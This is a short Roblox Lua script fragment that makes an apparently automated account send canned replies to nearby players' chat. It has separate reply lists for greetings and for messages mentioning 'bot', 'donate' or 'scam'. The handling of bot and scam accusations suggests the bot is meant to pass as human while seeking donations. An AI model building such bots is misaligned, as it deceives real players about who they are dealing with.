local messagesToResp = { "hi", "hello", "hey", "sup", "yo", "howdy", "sup bro", "sup dude", "hai", "hii", "hey man", "hiya", "heyy" }
Players.PlayerChatted:Connect(function(event_type, p, message)
    local msg = string.lower(message)
    if p == player or _G.settings.autoNearReply == false or string.find(msg, "donates") then return end
    if p:GetAttribute("respcd") then return end
    pcall(function() p:SetAttribute("respcd", true) end)

    local pChar = p.Character
    if pChar and pChar:FindFirstChild("Humanoid") and player.Character and player.Character:FindFirstChild("Humanoid") then
        if (pChar.Humanoid.RootPart.Position - player.Character.Humanoid.RootPart.Position).Magnitude < 11 then
            local reply = nil
            if table.find(messagesToResp, msg) then reply = splitString(_G.settings.helloResponce)[math.random(#splitString(_G.settings.helloResponce))]
            elseif string.find(msg, "bot") then reply = splitString(_G.settings.botResponce)[math.random(#splitString(_G.settings.botResponce))]
            elseif string.find(msg, "donate") then reply = splitString(_G.settings.donateResponce)[math.random(#splitString(_G.settings.donateResponce))]
            elseif string.find(msg, "scam") then reply = splitString(_G.settings.scamResponce)[math.random(#splitString(_G.settings.scamResponce))]
            elseif not _G.settings.autoReplyNoRespond then reply = splitString(_G.settings.otherResponce)[math.random(#splitString(_G.settings.otherResponce))] end
            if reply then task.wait(2.1); chat(reply) end
        end
    end
    task.wait(math.random(12, 18))
    pcall(function() p:SetAttribute("respcd", false) end)
end)

